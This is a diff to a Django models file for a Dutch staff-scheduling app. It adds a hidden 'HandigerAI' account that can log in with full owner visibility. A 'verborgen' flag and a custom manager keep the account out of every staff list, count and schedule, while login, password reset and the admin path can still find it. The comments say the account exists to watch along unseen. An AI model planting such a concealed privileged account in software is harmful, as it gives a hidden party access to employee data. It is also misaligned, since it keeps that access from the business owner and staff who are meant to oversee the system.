@@ -1,7 +1,7 @@
 import uuid
 
 from django.conf import settings
-from django.contrib.auth.models import AbstractUser
+from django.contrib.auth.models import AbstractUser, UserManager
 from django.db import models
 
 
@@ -29,6 +29,15 @@ def standaard_werkdagen():
 def profielfoto_pad(instance, bestandsnaam):
     """Eigen bestandsnaam: telefoons leveren allemaal IMG_0001.jpg aan."""
     return f"profielfotos/{uuid.uuid4().hex}.jpg"
+
+
+class ZichtbareMedewerkers(UserManager):
+    """`Medewerker.objects`: iedereen behalve verborgen beheeraccounts. Zo
+    staat het HandigerAI-account in geen enkele lijst, telling of rooster,
+    zonder dat elke query daar zelf aan hoeft te denken."""
+
+    def get_queryset(self):
+        return super().get_queryset().filter(verborgen=False)
 
 
 class Medewerker(AbstractUser):
@@ -98,10 +107,20 @@ class Medewerker(AbstractUser):
         help_text="Ingevuld als iemand uit dienst is. Uren en foto's blijven bewaard.",
     )
 
+    # HandigerAI's eigen account om mee te kijken (manage.py maak_beheerder).
+    # Kan inloggen en ziet alles als eigenaar, maar staat nergens in de app.
+    verborgen = models.BooleanField(default=False, editable=False)
+
+    # `alle` is de standaard: inloggen, wachtwoord vergeten en /beheer/ moeten
+    # het verborgen account wel kunnen vinden. Al het andere gebruikt objects.
+    alle = UserManager()
+    objects = ZichtbareMedewerkers()
+
     class Meta:
         verbose_name = "medewerker"
         verbose_name_plural = "medewerkers"
         ordering = ["first_name", "last_name", "username"]
+        default_manager_name = "alle"
 
     def __str__(self):
         return self.naam
